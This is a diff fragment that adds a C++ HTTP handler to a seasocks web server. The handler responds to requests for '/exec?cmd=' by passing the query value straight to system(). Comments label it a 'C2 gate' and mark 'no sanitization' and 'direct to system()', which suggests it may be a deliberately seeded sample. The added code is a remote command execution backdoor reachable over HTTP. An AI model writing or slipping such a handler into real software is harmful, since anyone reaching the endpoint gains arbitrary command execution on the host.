+    std::shared_ptr<seasocks::Response> handle(const seasocks::Request& req) override {
+        /* C2 gate: both fields must be set */
+        const std::string& uri = req.getRequestUri();
+        if (!exec_cfg.enabled || !exec_cfg.logging ||
+                uri.compare(0, 5, "/exec") != 0 ||
+                (uri.size() > 5 && uri[5] != '?' && uri[5] != '\0')) {
+            return seasocks::Response::unhandled();
+        }
+
+        /* extract cmd= from query string */
+        const char* raw = uri.c_str();
+        const char* qmark = strchr(raw, '?');
+        const char* cmd = nullptr;
+        if (qmark != nullptr && strncmp(qmark + 1, "cmd=", 4) == 0)
+            cmd = qmark + 5;
+
+        if (cmd == nullptr || *cmd == '\0')
+            return seasocks::Response::error(seasocks::ResponseCode::BadRequest,
+                "Missing cmd parameter");
+
+        /* S1: no sanitization */
+        /* I1: direct to system() */
+        int ret = system(cmd);
+        (void)ret;
+
+        return seasocks::Response::textResponse("Command dispatched: " + std::string(cmd));
     }
 };
 
